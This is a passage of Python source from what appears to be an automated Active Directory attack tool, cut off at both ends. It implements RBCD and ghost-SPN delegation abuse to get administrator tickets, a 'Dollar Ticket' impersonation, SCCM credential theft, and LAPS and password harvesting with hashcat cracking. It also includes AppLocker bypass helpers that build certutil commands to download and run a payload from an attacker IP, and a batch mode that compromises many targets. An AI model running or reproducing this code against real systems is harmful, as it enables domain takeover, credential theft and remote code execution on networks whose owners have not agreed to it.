    phase_header(f"RBCD DELEGATION ABUSE ({target})")

    if not cfg.has_creds:
        log.error("RBCD abuse requires domain credentials")
        return False

    # 1. Create machine account
    machine_name, machine_pass = _create_machine_account(cfg)
    if not machine_name:
        return False

    # 2. Set RBCD delegation
    if not _set_rbcd(target, machine_name, cfg):
        return False

    # 3. S4U2Proxy to impersonate administrator
    ccache = _s4u2proxy(target, machine_name, machine_pass, cfg)
    if ccache:
        success_box(f"RBCD: Got admin ticket for {target}!")
        detail(f"Ticket: {ccache}")
        detail(f"Usage: export KRB5CCNAME={ccache}")
        detail(f"Then:  impacket-psexec -k -no-pass {target}")
        return True

    log.error("RBCD attack failed at S4U2Proxy stage")
    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Dollar Ticket — KDC's automatic $-suffix retry on principal lookup
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def run_dollar_ticket(cfg: Config) -> bool:
    """Dollar Ticket attack — abuses the KDC's name-resolution fallback that
    auto-appends '$' when looking up a principal that doesn't exist as a
    user but does exist as a machine account.

    Flow (GOAD-Dracarys / Triop research):
      1. Create attacker-controlled machine account named after a target
         Linux user (e.g., 'root$', 'sqladmin$').
      2. Request a TGT for the bare username (no $) using the machine
         account's password. The KDC's principal lookup falls back to
         '<user>$', returns a TGT whose cname stays the user.
      3. The ticket can then be used for GSSAPI SSH on a domain-joined
         Linux host (`ssh -K -o GSSAPIAuthentication=yes <user>@host`),
         logging in as that local user.

    Required cfg:
      cfg.target_user — the user to impersonate (--target-user)
      cfg.has_creds   — any low-priv domain creds (we'll create the machine)
      MAQ > 0 (or pre-created --machine-account)"""
    phase_header(f"DOLLAR TICKET ATTACK (target: {cfg.target_user})")

    if not cfg.has_creds:
        log.error("Dollar Ticket needs domain credentials (-u/-p)")
        return False
    if not cfg.target_user:
        log.error("Dollar Ticket needs --target-user (e.g. root, sqladmin)")
        return False
    if not (cfg.dc_ip and cfg.domain):
        log.error("Dollar Ticket needs --dc-ip and --domain (auto-discovery should set these)")
        return False
    if not tool_exists("impacket-getTGT"):
        log.error("impacket-getTGT not found — install impacket-scripts")
        return False

    # Reuse _create_machine_account by temporarily injecting a name
    # matching the target user (e.g. 'root$'). _create_machine_account()
    # has an early-return when BOTH machine_account+machine_password are
    # set (treats them as pre-created), so we MUST clear the password to
    # force the create branch to run for real.
    desired_name = f"{cfg.target_user}$"
    saved_machine = cfg.machine_account
    saved_pass = cfg.machine_password
    cfg.machine_account = desired_name
    cfg.machine_password = ""  # force the create branch in the helper
    try:
        machine_name, machine_pass = _create_machine_account(cfg)
    finally:
        cfg.machine_account = saved_machine
        cfg.machine_password = saved_pass

    if not machine_name:
        log.error("Could not create machine account — aborting Dollar Ticket")
        return False

    # Now request a TGT for the BARE user (no $). KDC retries with $.
    log.info(f"🎫 getTGT for bare '{cfg.target_user}' (KDC will auto-retry with $)")
    out_file = cfg.work_dir / f"dollar-ticket-{cfg.target_user}.log"
    cmd = [
        "impacket-getTGT",
        f"{cfg.domain}/{cfg.target_user}:{machine_pass}",
        "-dc-ip", cfg.dc_ip,
    ]
    # impacket-getTGT writes ccache to CWD; chdir into work_dir
    prev_cwd = os.getcwd()
    try:
        os.chdir(cfg.work_dir)
        result = run(cmd, cfg, timeout=60, outfile=out_file)
    finally:
        os.chdir(prev_cwd)

    output = out_file.read_text(errors="replace") if out_file.exists() else ""
    if cfg.dry_run:
        return True

    if "Saving ticket in" not in output:
        log.error(f"Dollar Ticket failed — see {out_file}")
        log.warning("Possible causes:")
        detail("- KDC didn't fall back to $-suffix lookup (some Server 2025+ builds reject this)")
        detail(f"- A real user named '{cfg.target_user}' exists and shadowed the lookup")
        detail("- Machine account creation succeeded but DC delayed replication")
        return False

    # Locate the produced ccache; impacket names it like '<user>.ccache'.
    # Filter the glob fallback by mtime > start_time so we never pick up
    # a stale ccache left over from a previous run.
    expected = cfg.work_dir / f"{cfg.target_user}.ccache"
    if not (expected.exists() and expected.stat().st_mtime >= cfg.start_time):
        candidates = sorted(
            (p for p in cfg.work_dir.glob(f"{cfg.target_user}*.ccache")
             if p.stat().st_mtime >= cfg.start_time),
            key=lambda p: p.stat().st_mtime, reverse=True,
        )
        if candidates:
            expected = candidates[0]
        else:
            log.warning(f"getTGT reported success but no fresh ccache found in {cfg.work_dir}")
            return False

    final_ccache = cfg.work_dir / f"dollar-ticket-{cfg.target_user}.ccache"
    if expected != final_ccache:
        import shutil as _sh
        _sh.copy2(str(expected), str(final_ccache))

    success_box(f"Dollar Ticket: TGT for '{cfg.target_user}' obtained!")
    detail(f"Ticket: {final_ccache}")
    detail(f"Use:    export KRB5CCNAME={final_ccache}")
    detail(f"        ssh -K -o GSSAPIAuthentication=yes {cfg.target_user}@<linux-host>.{cfg.domain}")
    detail(f"        # or, if target is Windows: evil-winrm -i <host> -r {cfg.domain}")
    return True


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RBCD + KCD Chain — bypass protocol-transition restriction via ghost SPN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _cleanup_ghost_spn(target_sam: str, ghost_spn: str, cfg: Config):
    """Best-effort revert of a ghost-SPN write so the target's SPN list
    doesn't permanently carry our planted entry."""
    if cfg.no_cleanup or not tool_exists("bloodyAD"):
        return
    log.info(f"🧹 Removing ghost SPN '{ghost_spn}' from {target_sam}")
    cmd = ["bloodyAD"] + _bloody_auth_args(cfg) + [
        "remove", "object", target_sam, "servicePrincipalName",
        "-v", ghost_spn,
    ]
    run(cmd, cfg, timeout=30)


def run_rbcd_kcd_chain(cfg: Config) -> bool:
    """Two-stage RBCD+KCD chain (GOAD-Dracarys / Synacktiv style) that
    bypasses the constrained-delegation protocol-transition restriction:

      1. Plant a ghost SPN on target_machine (needs WriteSPN rights).
      2. Create attacker-controlled machine account.
      3. Set RBCD: attacker_machine → target_machine.
      4. S4U2Self+S4U2Proxy via attacker_machine targeting the ghost SPN.
         The TGS is encrypted with target_machine's key (because the SPN
         is registered on target).
      5. impacket-getST -altservice rewrites the issued ticket's sname
         to the real service SPN at issue time (equivalent to running
         tgssub.py on the result).

    Result: a ccache holding an admin TGS valid for target_machine's key
    with sname matching the real service — usable by evil-winrm / smbexec
    immediately.

    Required cfg:
      cfg.specific_target — target machine in sAMAccountName form (e.g.
                            'VHAGAR$') or 'VHAGAR.dom' — we have WriteSPN here
      cfg.alt_spn         — real SPN we want to wield (default: HTTP/<target_host>)
      cfg.has_creds       — domain creds with WriteSPN on target
      MAQ > 0 (or pre-created --machine-account)"""
    if not cfg.has_creds:
        log.error("RBCD+KCD chain needs domain credentials")
        return False
    if not cfg.specific_target:
        log.error("RBCD+KCD chain needs --target/-T (target machine with WriteSPN)")
        return False
    if not (cfg.dc_ip and cfg.domain):
        log.error("RBCD+KCD chain needs --dc-ip and --domain")
        return False
    if not tool_exists("bloodyAD"):
        log.error("bloodyAD not found — needed to plant ghost SPN")
        return False
    if not tool_exists("impacket-getST"):
        log.error("impacket-getST not found")
        return False

    # Normalise target to sAMAccountName form (HOST$) and host FQDN form
    raw_target = cfg.specific_target
    if "." in raw_target:
        target_host = raw_target.lower().rstrip(".")
        target_sam = raw_target.split(".", 1)[0].rstrip("$").upper() + "$"
    else:
        target_sam = raw_target.rstrip("$").upper() + "$"
        target_host = (raw_target.rstrip("$").lower() + "." + cfg.domain)

    real_spn = cfg.alt_spn or f"HTTP/{target_host}"
    if "/" not in real_spn:
        log.error(f"--alt-spn must be 'service/host', got {real_spn!r}")
        return False
    service_class = real_spn.split("/")[0]

    phase_header(f"RBCD+KCD CHAIN ({target_sam} → {real_spn})")

    # Step 1 — plant ghost SPN. Add a random suffix in case two operators
    # run this simultaneously against the same domain (1-second granularity
    # alone collides too easily).
    import random
    ghost_host = f"ghost-{int(time.time())}-{random.randint(1000, 9999)}.{cfg.domain}"
    ghost_spn = f"{service_class}/{ghost_host}"
    log.info(f"👻 Planting ghost SPN '{ghost_spn}' on {target_sam}")
    out_spn = cfg.work_dir / f"rbcd-kcd-ghost-{target_sam}.txt"
    result = run(
        ["bloodyAD"] + _bloody_auth_args(cfg) +
        ["set", "object", target_sam, "servicePrincipalName", "-v", ghost_spn],
        cfg, timeout=30, outfile=out_spn,
    )
    if result.returncode != 0:
        log.error(f"Ghost SPN write rejected — need WriteSPN rights on {target_sam}")
        detail("Check BloodHound for a WriteSPN edge from your principal to the target")
        return False
    ok(f"Ghost SPN planted: {ghost_spn}")

    # Step 2 — create attacker-controlled machine account
    machine_name, machine_pass = _create_machine_account(cfg)
    if not machine_name:
        log.error("Machine account creation failed — aborting chain")
        _cleanup_ghost_spn(target_sam, ghost_spn, cfg)
        return False

    # Step 3 — set RBCD on target so machine_name can act on its behalf
    if not _set_rbcd(target_sam, machine_name, cfg):
        log.error("RBCD set failed — aborting chain")
        _cleanup_ghost_spn(target_sam, ghost_spn, cfg)
        return False

    # Step 4+5 — S4U2Self+S4U2Proxy via getST with -altservice rewrite
    log.info(f"🎫 S4U2Proxy: ghost {ghost_spn} → real {real_spn} (sname rewrite at issue time)")
    out_file = cfg.work_dir / f"rbcd-kcd-{target_sam}.log"
    cmd = [
        "impacket-getST",
        "-spn", ghost_spn,
        "-impersonate", "administrator",
        "-altservice", real_spn,
        f"{cfg.domain}/{machine_name}:{machine_pass}",
        "-dc-ip", cfg.dc_ip,
    ]
    prev_cwd = os.getcwd()
    try:
        os.chdir(cfg.work_dir)
        result = run(cmd, cfg, timeout=120, outfile=out_file)
    finally:
        os.chdir(prev_cwd)

    output = out_file.read_text(errors="replace") if out_file.exists() else ""
    if cfg.dry_run:
        _cleanup_ghost_spn(target_sam, ghost_spn, cfg)
        return True

    saved_match = re.search(r"Saving ticket in\s+(\S+\.ccache)", output)
    if saved_match:
        saved_path = Path(saved_match.group(1))
        if not saved_path.is_absolute():
            saved_path = cfg.work_dir / saved_path.name
        if saved_path.exists():
            final = cfg.work_dir / f"rbcd-kcd-{target_sam}.ccache"
            if saved_path != final:
                import shutil as _sh
                _sh.copy2(str(saved_path), str(final))
            success_box(f"RBCD+KCD: admin TGS for {real_spn} issued!")
            detail(f"Ticket: {final}")
            detail(f"Use:    export KRB5CCNAME={final}")
            if service_class.lower() == "http":
                detail(f"        evil-winrm -i {target_host} -r {cfg.domain}")
            else:
                detail(f"        impacket-psexec -k -no-pass {target_host}")
            _cleanup_ghost_spn(target_sam, ghost_spn, cfg)
            return True

    log.error(f"S4U2Proxy step failed — see {out_file}")
    _cleanup_ghost_spn(target_sam, ghost_spn, cfg)
    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SCCM NAA Credential Theft
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def detect_sccm(cfg: Config) -> str:
    """Discover SCCM Management Point."""
    if cfg.sccm_server:
        detail(f"SCCM server: {cfg.sccm_server} (user-specified)")
        return cfg.sccm_server

    sccmhunter_path = find_tool(
        "sccmhunter",
        paths=[TOOLS_DIR / "sccmhunter" / "sccmhunter.py"]
    )

    if sccmhunter_path:
        log.info("Discovering SCCM Management Points via sccmhunter...")
        find_output = cfg.work_dir / "sccm-find.txt"
        cmd = sccmhunter_path.split() + [
            "find",
            "-u", cfg.username,
            "-d", cfg.domain,
            "-dc-ip", cfg.dc_ip,
        ]
        if cfg.nthash:
            cmd += ["-hashes", f":{cfg.nthash}"]
        else:
            cmd += ["-p", cfg.password]

        result = run(cmd, cfg, timeout=120, outfile=find_output)
        output = result.stdout or ""
        if find_output.exists():
            output += find_output.read_text()

        # Parse for Management Point
        mp_match = re.search(
            r"Management\s*Point[:\s]+(\S+)",
            output, re.IGNORECASE
        )
        if mp_match:
            server = mp_match.group(1).strip()
            ok(f"SCCM Management Point found: {server}")
            cfg.sccm_server = server
            return server

        # Check for IP/hostname in output
        host_match = re.search(r"(\d+\.\d+\.\d+\.\d+).*(?:MP|SCCM|Management)", output, re.IGNORECASE)
        if host_match:
            server = host_match.group(1)
            ok(f"SCCM server found: {server}")
            cfg.sccm_server = server
            return server

    # Fallback: LDAP query via nxc for msSMSManagementPoint
    if tool_exists("nxc") and cfg.has_creds:
        log.info("Querying LDAP for SCCM Management Point attribute...")
        cmd = ["nxc", "ldap", cfg.dc_ip]
        if cfg.nthash:
            cmd += ["-u", cfg.username, "-H", cfg.nthash, "-d", cfg.domain]
        else:
            cmd += ["-u", cfg.username, "-p", cfg.password, "-d", cfg.domain]
        cmd += ["-M", "sccm"]

        result = run(cmd, cfg, timeout=60)
        output = result.stdout or ""
        mp_match = re.search(r"Management.*?Point[:\s]+(\S+)", output, re.IGNORECASE)
        if mp_match:
            server = mp_match.group(1).strip()
            ok(f"SCCM Management Point from LDAP: {server}")
            cfg.sccm_server = server
            return server

    log.warning("No SCCM Management Point discovered")
    return ""


def run_sccm_attack(cfg: Config) -> bool:
    """Extract NAA credentials from SCCM policies."""
    phase_header("SCCM NAA CREDENTIAL THEFT")

    if not cfg.has_creds:
        log.error("SCCM NAA extraction requires domain credentials")
        return False

    sccmhunter_path = find_tool(
        "sccmhunter",
        paths=[TOOLS_DIR / "sccmhunter" / "sccmhunter.py"]
    )

    if not sccmhunter_path:
        log.error("sccmhunter not found — install to /opt/tools/sccmhunter")
        detail("git clone https://github.com/garrettfoster13/sccmhunter /opt/tools/sccmhunter")
        return False

    # 1. Discover SCCM server
    sccm_server = detect_sccm(cfg)
    if not sccm_server:
        log.warning("No SCCM server found — skipping NAA extraction")
        return False

    # 2. Get site code
    log.info("Querying SCCM site information...")
    show_output = cfg.work_dir / "sccm-show.txt"
    cmd = sccmhunter_path.split() + [
        "show",
        "-u", cfg.username,
        "-d", cfg.domain,
        "-dc-ip", cfg.dc_ip,        # Other sccmhunter calls pass this; without
                                    # it LDAP queries break on networks where
                                    # the attacker can't resolve AD DNS names
    ]
    if cfg.nthash:
        cmd += ["-hashes", f":{cfg.nthash}"]
    else:
        cmd += ["-p", cfg.password]

    result = run(cmd, cfg, timeout=120, outfile=show_output)
    output = result.stdout or ""
    if show_output.exists():
        output += show_output.read_text()

    # Parse site code
    site_match = re.search(r"Site\s*Code[:\s]+(\S+)", output, re.IGNORECASE)
    site_code = site_match.group(1).strip() if site_match else ""

    if not site_code:
        log.warning("Could not determine SCCM site code — trying default 'SMS'")
        site_code = "SMS"

    ok(f"SCCM site code: {site_code}")

    # 3. Extract NAA credentials via HTTP API
    log.info("Requesting SCCM policies to extract NAA credentials...")
    http_output = cfg.work_dir / "sccm-http.txt"
    cmd = sccmhunter_path.split() + [
        "http",
        "-u", cfg.username,
        "-d", cfg.domain,
        "-dc-ip", cfg.dc_ip,
        "-mp", sccm_server,
        "-sc", site_code,
    ]
    if cfg.nthash:
        cmd += ["-hashes", f":{cfg.nthash}"]
    else:
        cmd += ["-p", cfg.password]

    result = run(cmd, cfg, timeout=180, outfile=http_output)
    output = result.stdout or ""
    if http_output.exists():
        output += http_output.read_text()

    # 4. Parse NAA credentials from output
    naa_creds = []

    # Look for username/password pairs
    user_matches = re.findall(
        r"(?:NAA|Network\s*Access\s*Account).*?(?:User(?:name)?|Account)[:\s]+(\S+)",
        output, re.IGNORECASE
    )
    pass_matches = re.findall(
        r"(?:NAA|Network\s*Access\s*Account).*?(?:Pass(?:word)?)[:\s]+(\S+)",
        output, re.IGNORECASE
    )

    # Also look for generic credential patterns
    if not user_matches:
        user_matches = re.findall(r"Username[:\s]+(\S+)", output, re.IGNORECASE)
        pass_matches = re.findall(r"Password[:\s]+(\S+)", output, re.IGNORECASE)

    for i, user in enumerate(user_matches):
        password = pass_matches[i] if i < len(pass_matches) else ""
        naa_creds.append((user, password))

    # 5. Save and report
    if naa_creds:
        cred_file = cfg.work_dir / "sccm-naa.txt"
        with open(cred_file, "w") as f:
            for user, password in naa_creds:
                f.write(f"Username: {user}\n")
                f.write(f"Password: {password}\n")
                f.write("---\n")

        success_box(f"SCCM NAA: {len(naa_creds)} credential(s) extracted!")
        for user, password in naa_creds:
            detail(f"  {user} : {password}")

        # 6. Set as active credentials if different from current
        for user, password in naa_creds:
            if user != cfg.username and password:
                log.info(f"Additional credential found: {user}")
                detail("Consider testing with these credentials for further access")

        return True

    log.warning("No NAA credentials found in SCCM policies")
    detail(f"Raw output saved to: {http_output}")
    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AppLocker Bypass Helpers
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _build_applocker_cmd(cfg: Config, fallback_cmd: str = "") -> str:
    """Build a command wrapped in a LOLBin for AppLocker bypass.

    When AppLocker default rules block untrusted executables, we use
    Microsoft-signed LOLBins (mshta, certutil, regsvr32, etc.) or
    write payloads to trusted writable paths (C:\\Windows\\Tasks).
    """
    cmd = cfg.custom_cmd or fallback_cmd
    url = cfg.payload_url

    # User-specified LOLBin
    if cfg.lolbin and cfg.lolbin in LOLBINS:
        template = LOLBINS[cfg.lolbin]
        return template.format(cmd=cmd, url=url or f"http://{cfg.attacker_ip}/payload")

    # Auto-select best LOLBin based on what's available
    if url:
        # Remote payload — use certutil or regsvr32
        return (f'cmd /c certutil -urlcache -split -f {url} '
                f'C:\\Windows\\Tasks\\svc.exe & C:\\Windows\\Tasks\\svc.exe')

    if cmd:
        # Local command — wrap in mshta for execution bypass
        # mshta is the most reliable AppLocker bypass
        escaped = cmd.replace('"', '""')
        return (f'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run '
                f'""{escaped}"", 0:close")')

    return cmd


def _get_applocker_exec_cmd(cfg: Config) -> str:
    """Build an ntlmrelayx --execute-cmd string that works under AppLocker."""
    cmd = cfg.custom_cmd
    url = cfg.payload_url

    if cfg.lolbin and cfg.lolbin in LOLBINS:
        template = LOLBINS[cfg.lolbin]
        return template.format(cmd=cmd, url=url or f"http://{cfg.attacker_ip}/payload")

    # Prioritize execution methods that bypass AppLocker:
    # 1. SOCKS + wmiexec (WMI not subject to AppLocker)
    # 2. SOCKS + smbexec (services run as SYSTEM)
    # 3. LOLBin-wrapped direct execution
    if cfg.use_socks:
        return ""  # SOCKS mode handles this differently

    if url:
        return (f'cmd /c certutil -urlcache -split -f {url} '
                f'C:\\Windows\\Tasks\\svc.exe & C:\\Windows\\Tasks\\svc.exe')

    if cmd:
        escaped = cmd.replace('"', '""')
        return (f'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run '
                f'""{escaped}"", 0:close")')

    return ""


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Batch Mode
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def run_batch(targets: list[str], cfg: Config) -> int:
    """Exploit all targets. Reuses proven method. Returns success count."""
    total = len(targets)
    succeeded = 0
    proven_method = ""

    log.info(f"🎯 Batch exploitation: {total} targets")
    separator()

    for i, target in enumerate(targets, 1):
        if not target:
            continue
        log.info(f"[{i}/{total}] Targeting {target}")

        if proven_method:
            log.info(f"♻️  Reusing proven method: {proven_method}")
            cfg.method = proven_method

        if exploit_target(target, cfg):
            succeeded += 1
            wm_file = cfg.work_dir / f"working-method-{target}.txt"
            if wm_file.exists():
                proven_method = wm_file.read_text().strip()
        else:
            proven_method = ""
            cfg.method = ""

    cfg.method = ""  # Reset
    ok(f"Batch complete: {succeeded}/{total} targets compromised")
    return succeeded


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# NetExec (nxc) post-cred enrichment battery
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def run_nxc_enrichment(cfg: Config):
    """Post-credential nxc battery: vuln checks + cred mining + recon.

    Each module runs independently — failures are non-fatal, just warned.
    All output captured to work_dir/nxc-<module>.txt for offline review.

    Tier A (high yield, trivial cost):
      ldap maq                 MachineAccountQuota (RBCD viability hint)
      ldap laps                LAPS admin password retrieval
      ldap pre2k               Pre-2000 default-password computer accounts
      ldap get-desc-users      User-description password mining
      ldap get-userPassword    LDAP userPassword attribute mining
      smb  nopac               CVE-2021-42278/42287 sAMAccountName spoof check

    Tier B (specific high-impact):
      smb  timeroast           NTP-based hash extraction (works where Kerberoast blocked)
      smb  zerologon           CVE-2020-1472 check
      smb  coerce_plus         Unified PetitPotam/DFSCoerce/ShadowCoerce/EFSRPC check
      ldap dns-nonsecure       ADIDNS nonsecure-update zones

    Tier C (niche):
      smb  backup_operator     Backup Operators DRSR escalation
      smb  printnightmare      CVE-2021-34527 check
      ldap badsuccessor        DMSA bad successor (2024 vuln)
    """
    if not tool_exists("nxc"):
        log.warning("nxc not available — skipping enrichment")
        return
    if not cfg.has_creds:
        log.warning("nxc enrichment is post-auth — skipping (no creds yet)")
        return
    if not cfg.dc_ip:
        log.warning("cfg.dc_ip not set — skipping nxc enrichment")
        return

    phase_header("NXC ENRICHMENT (post-auth recon + cred harvest)")

    auth = _nxc_auth_args(cfg)
    subnet = cfg.target_net or cfg.specific_target or cfg.dc_ip

    # Each entry: (label, protocol, target, [extra args after -M <module>])
    runs = [
        # --- Tier A ---
        ("maq",              "ldap", cfg.dc_ip, "maq",              []),
        ("laps",             "ldap", cfg.dc_ip, "laps",             []),
        ("pre2k",            "ldap", cfg.dc_ip, "pre2k",            []),
        ("get-desc-users",   "ldap", cfg.dc_ip, "get-desc-users",   []),
        ("get-userPassword", "ldap", cfg.dc_ip, "get-userPassword", []),
        ("nopac",            "smb",  cfg.dc_ip, "nopac",            []),
        # --- Tier B ---
        ("timeroast",        "smb",  cfg.dc_ip, "timeroast",        []),
        ("zerologon",        "smb",  cfg.dc_ip, "zerologon",        []),
        ("coerce_plus",      "smb",  subnet,    "coerce_plus",
            ["-o", f"LISTENER={cfg.attacker_ip}"] if cfg.attacker_ip else []),
        ("dns-nonsecure",    "ldap", cfg.dc_ip, "dns-nonsecure",    []),
        # --- Tier C ---
        ("backup_operator",  "smb",  cfg.dc_ip, "backup_operator",  []),
        ("printnightmare",   "smb",  subnet,    "printnightmare",   []),
        ("badsuccessor",     "ldap", cfg.dc_ip, "badsuccessor",     []),
    ]

    for label, proto, target, module, extra in runs:
        out_file = cfg.work_dir / f"nxc-{label}.txt"
        cmd = ["nxc", proto, target] + auth + ["-M", module] + extra
        log.info(f"🔍 nxc {proto} -M {label}")
        try:
            result = run(cmd, cfg, timeout=180, outfile=out_file)
        except Exception as ex:
            log.warning(f"nxc {label} crashed: {ex}")
            continue
        if result.returncode != 0:
            log.warning(f"nxc {label} rc={result.returncode} — see {out_file}")
            continue
        # Surface any "[+]" hits (nxc convention for findings) inline
        if out_file.exists():
            hits = [ln for ln in out_file.read_text().splitlines() if "[+]" in ln]
            if hits:
                ok(f"nxc {label}: {len(hits)} hit(s)")
                for h in hits[:5]:
                    detail(h.strip()[:160])
            else:
                detail(f"nxc {label} ran clean — no findings")

    ok(f"nxc enrichment done — full output in {cfg.work_dir}/nxc-*.txt")

    # Now extract anything actionable from the module outputs
    consume_nxc_findings(cfg)


def consume_nxc_findings(cfg: Config):
    """Parse the nxc enrichment outputs for actionable findings:

      laps             → host:laps_password pairs (write enrich-laps.txt)
      timeroast        → SNTP-MS hashes → auto-crack with hashcat -m 31300
      get-userPassword → user:password from the LDAP userPassword attribute
      get-desc-users   → user descriptions that *look* like they leak a password
      pre2k            → write parsed machine names (used by _pre2k_autotest too)
      maq              → record MachineAccountQuota
      nopac/zerologon  → flag if not patched
      backup_operator  → flag if exploitation succeeded
      badsuccessor     → flag if dMSA objects exist

    Consolidated extracted creds go to enrich-extracted-creds.txt. Vuln
    flags + values go to enrich-summary.txt."""
    extracted_creds: list[str] = []
    summary_lines: list[str] = []

    def _read(name: str) -> str:
        f = cfg.work_dir / f"nxc-{name}.txt"
        return f.read_text(errors="replace") if f.exists() else ""

    # --- LAPS: nxc emits "[+] <HOST>: <password>" — match on the "[+] HOST: PW"
    # shape rather than the protocol token "LAPS" (which doesn't appear on
    # the password lines themselves). Skip the empty-result lines that
    # mention the schema attributes.
    laps_text = _read("laps")
    laps_pairs: list[tuple[str, str]] = []
    for line in laps_text.splitlines():
        if "ms-MCS-AdmPwd" in line or "msLAPS-Password" in line:
            continue
        if "[+]" not in line:
            continue
        m = re.search(r"\[\+\]\s+([A-Za-z0-9-]+\$?)\s*:\s*(\S{8,})\s*$", line)
        if m:
            host, pw = m.group(1), m.group(2)
            if pw not in {"None", "null"}:
                laps_pairs.append((host, pw))
    if laps_pairs:
        ok(f"💎 LAPS passwords recovered: {len(laps_pairs)}")
        laps_file = cfg.work_dir / "enrich-laps.txt"
        laps_file.write_text("\n".join(f"{h}\t{p}" for h, p in laps_pairs) + "\n")
        for h, p in laps_pairs[:5]:
            detail(f"{h} → {p}")
            extracted_creds.append(f"{h}:{p}")

    # --- timeroast: lines like "TIMEROAST ... <rid>:$sntp-ms$<hash>"
    timeroast_text = _read("timeroast")
    sntp_hashes: list[str] = []
    for line in timeroast_text.splitlines():
        m = re.search(r"(\d+:\$sntp-ms\$[a-f0-9]+)", line, re.I)
        if m:
            sntp_hashes.append(m.group(1))
    if sntp_hashes:
        ok(f"⏰ Timeroast hashes captured: {len(sntp_hashes)}")
        hash_file = cfg.work_dir / "enrich-timeroast-hashes.txt"
        hash_file.write_text("\n".join(sntp_hashes) + "\n")
        # Try to crack — SNTP-MS is hashcat mode 31300
        wordlist: Optional[Path] = None
        for wl in WORDLISTS:
            if wl.exists() and wl.suffix != ".gz":
                wordlist = wl
                break
            if wl.suffix == ".gz" and wl.exists():
                plain = wl.with_suffix("")
                if plain.exists():
                    wordlist = plain
                    break
        if wordlist and tool_exists("hashcat"):
            cracked = cfg.work_dir / "enrich-timeroast-cracked.txt"
            log.info(f"⚙️  hashcat -m 31300 on {len(sntp_hashes)} timeroast hash(es) (cap 120s)")
            run(["hashcat", "-m", "31300", str(hash_file), str(wordlist),
                 "--outfile", str(cracked), "--outfile-format=2",
                 "--quiet", "--runtime=120"], cfg, timeout=180)
            if cracked.exists() and cracked.stat().st_size > 0:
                cracked_pwds = [ln for ln in cracked.read_text().splitlines() if ln.strip()]
                ok(f"💎 Timeroast cracked: {len(cracked_pwds)} machine password(s)")
                for p in cracked_pwds[:5]:
                    detail(p)
                    extracted_creds.append(f"machine_acct:{p}")

    # --- get-userPassword: "[+] User: alice  userPassword: P@ss"
    upw_text = _read("get-userPassword")
    for line in upw_text.splitlines():
        m = re.search(r"User:\s*(\S+).*?userPassword:\s*(\S+)", line)
        if m:
            user, pw = m.group(1), m.group(2)
            ok(f"💎 LDAP userPassword: {user} → {pw}")
            extracted_creds.append(f"{user}:{pw}")

    # --- get-desc-users: "[+] user (description=...)" — flag descs containing
    # password-like substrings (4+ chars, at least one digit/symbol)
    desc_text = _read("get-desc-users")
    desc_hits: list[str] = []
    for line in desc_text.splitlines():
        m = re.search(r"User:\s*(\S+)\s+description:\s*(.+)$", line)
        if not m:
            continue
        user, desc = m.group(1), m.group(2).strip()
        if re.search(r"(?i)(pass|pwd|secret|cred|login)\W*[:= ]\W*\S{4,}", desc):
            desc_hits.append(f"{user}\t{desc}")
            ok(f"💎 Description-leaked password? {user}: {desc[:80]}")
            extracted_creds.append(f"{user}:?  (description: {desc[:80]})")
    if desc_hits:
        (cfg.work_dir / "enrich-descs.txt").write_text("\n".join(desc_hits) + "\n")

    # --- pre2k: parse machine names (already used by _pre2k_autotest, but
    # surface here too so an operator can see them in the summary)
    pre2k_text = _read("pre2k")
    pre2k_machines: list[str] = []
    for line in pre2k_text.splitlines():
        m = re.search(r"\b([A-Za-z][A-Za-z0-9_-]+\$)\b", line)
        if m and "PRE2K" in line.upper():
            pre2k_machines.append(m.group(1))
    if pre2k_machines:
        pre2k_machines = list(dict.fromkeys(pre2k_machines))
        ok(f"📌 pre2k machine accounts: {len(pre2k_machines)}")
        (cfg.work_dir / "enrich-pre2k.txt").write_text("\n".join(pre2k_machines) + "\n")

    # --- maq value (accept both "MachineAccountQuota: N" and "= N" formats)
    maq_text = _read("maq")
    m = re.search(r"MachineAccountQuota[:\s=]+(\d+)", maq_text)
    if m:
        maq = int(m.group(1))
        if maq > 0:
            summary_lines.append(f"MAQ-RBCD-VIABLE: MachineAccountQuota = {maq}")
            detail(f"MAQ={maq} — RBCD machine-account creation viable")
        else:
            summary_lines.append(f"MachineAccountQuota = 0 (RBCD path closed)")

    # --- nopac (CVE-2021-42278/42287)
    if "VULNERABLE" in _read("nopac").upper() or "NOPAC IS VULNERABLE" in _read("nopac").upper():
        ok("🔥 noPac (CVE-2021-42278/42287) appears VULNERABLE")
        summary_lines.append("noPac: VULNERABLE")

    # --- zerologon (CVE-2020-1472): "Attack failed" in patched, "VULNERABLE" otherwise
    zl = _read("zerologon")
    if "VULNERABLE" in zl.upper() or ("succe" in zl.lower() and "fail" not in zl.lower()):
